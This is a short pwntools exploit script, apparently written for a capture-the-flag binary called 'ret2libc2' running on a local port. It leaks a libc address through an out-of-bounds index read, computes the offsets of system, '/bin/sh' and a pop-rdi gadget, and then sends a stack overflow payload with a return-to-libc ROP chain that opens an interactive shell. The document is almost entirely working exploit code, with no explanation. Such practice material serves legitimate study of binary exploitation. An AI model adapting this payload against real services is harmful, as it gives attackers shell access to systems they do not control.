from pwn import *

# r = process('./ret2libc2')
r = remote('127.0.0.1', 10005)

r.sendlineafter('>> ', '2')
r.sendlineafter('Index: ', '11')
number = int(r.recvline().strip().split(b': ')[1])
libc_base = number - 0x29d90
log.info(f'Libc: {hex(libc_base)}')
pop_rdi = libc_base + 0x2a3e5
system = libc_base + 0x50d70
bin_sh = libc_base + 0x1d8678
ret = pop_rdi + 1
payload = b'A' * (0x70 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
r.sendlineafter('>> ', '3')
r.sendlineafter('Leave a message: ', payload)

r.interactive()
